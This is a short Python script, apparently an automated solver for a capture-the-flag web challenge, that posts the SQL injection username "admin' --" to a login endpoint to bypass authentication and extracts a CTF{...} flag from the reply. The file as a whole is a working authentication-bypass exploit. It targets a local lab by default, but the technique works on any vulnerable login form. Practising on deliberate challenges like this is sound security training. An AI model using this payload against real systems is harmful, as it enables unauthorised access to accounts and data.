#!/usr/bin/env python3
"""
Easy SQL Injection Exploit Solver Script
CTF Web Challenge Automated Solution (Pure Python Stdlib)
"""
import sys
import re
import urllib.request
import urllib.parse

def solve(target_url):
    base_url = target_url.rstrip('/')
    if not base_url.endswith('/sqli'):
        login_endpoint = f"{base_url}/sqli/login"
    else:
        login_endpoint = f"{base_url}/login"
    
    payload_username = "admin' --"
    payload_password = "any_password"
    
    data = urllib.parse.urlencode({
        'username': payload_username,
        'password': payload_password
    }).encode('utf-8')
    
    req = urllib.request.Request(
        login_endpoint,
        data=data,
        headers={'Content-Type': 'application/x-www-form-urlencoded'}
    )
    
    print(f"[*] Sending SQLi payload '{payload_username}' to {login_endpoint}...")
    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            html = response.read().decode('utf-8')
            flag_match = re.search(r'CTF\{[A-Za-z0-9_]+\}', html)
            if flag_match:
                print(f"[+] SUCCESS! Found Flag: \033[92m{flag_match.group(0)}\033[0m")
                return True
            else:
                print("[-] Payload sent, but flag pattern was not found in response.")
                print(f"Response snippet:\n{html[:500]}")
    except Exception as e:
        print(f"[-] Request error: {e}")
        
    return False

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8001"
    success = solve(url)
    sys.exit(0 if success else 1)
